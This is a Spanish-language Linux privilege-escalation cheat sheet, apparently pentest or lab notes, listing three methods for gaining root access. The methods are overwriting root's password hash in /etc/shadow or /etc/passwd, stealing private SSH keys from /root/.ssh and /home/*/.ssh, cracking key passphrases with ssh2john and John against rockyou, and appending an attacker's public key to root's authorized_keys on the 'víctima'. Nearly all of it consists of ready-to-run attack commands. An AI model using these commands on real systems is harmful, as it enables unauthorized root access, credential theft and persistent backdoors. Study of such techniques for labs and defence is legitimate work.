### Método 1: Modificar /etc/shadow:

```bash
# Generar hash SHA-512
mkpasswd -m sha-512 password123

# Hacer backup
cp /etc/shadow /etc/shadow.bak

# Editar /etc/shadow y reemplazar el hash del usuario root
# Formato: root:<HASH_GENERADO>:...

# Cambiar a root
su root
# Contraseña: password123
```

### Método 2: Modificar /etc/passwd

```bash
# Generar hash con openssl
openssl passwd "password123"

# Hacer backup
cp /etc/passwd /etc/passwd.bak

# Editar /etc/passwd, añadiendo el hash después del usuario
# Formato: root:<HASH_GENERADO>:0:0:root:/root:/bin/bash

# Cambiar a root
su root
```

### Método 3: Robo de Claves SSH

Ubicaciones comunes:

```bash
/root/.ssh/id_rsa
/root/.ssh/id_ed25519
/home/*/.ssh/id_rsa
/home/*/.ssh/authorized_keys
```

###### Primera forma: Clave sin passphrase

```bash
# Copiar clave privada desde /.ssh/
cat /root/.ssh/id_rsa > root_key
chmod 600 root_key

# Conectar
ssh -oHostKeyAlgorithms=+ssh-rsa -i root_key root@<IP>
```

###### Segunda forma: Clave con passphrase (crackear)

```bash
# Convertir clave a formato John
ssh2john root_key > id_rsa.hash

# Crackear con John
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Conectar con la passphrase obtenida
ssh -oHostKeyAlgorithms=+ssh-rsa -i root_key root@<IP>
```

###### Tercera forma: Añadir tu clave pública a authorized_keys

```bash
# Si tienes escritura en /root/.ssh/authorized_keys
# En tu máquina, generar clave si no tienes
ssh-keygen -t rsa -b 4096

# Copiar tu clave pública
cat ~/.ssh/id_rsa.pub

# En la víctima, añadir tu clave
echo "ssh-rsa AAAA...tu_clave_publica..." >> /root/.ssh/authorized_keys

# Conectar
ssh root@<IP>
```

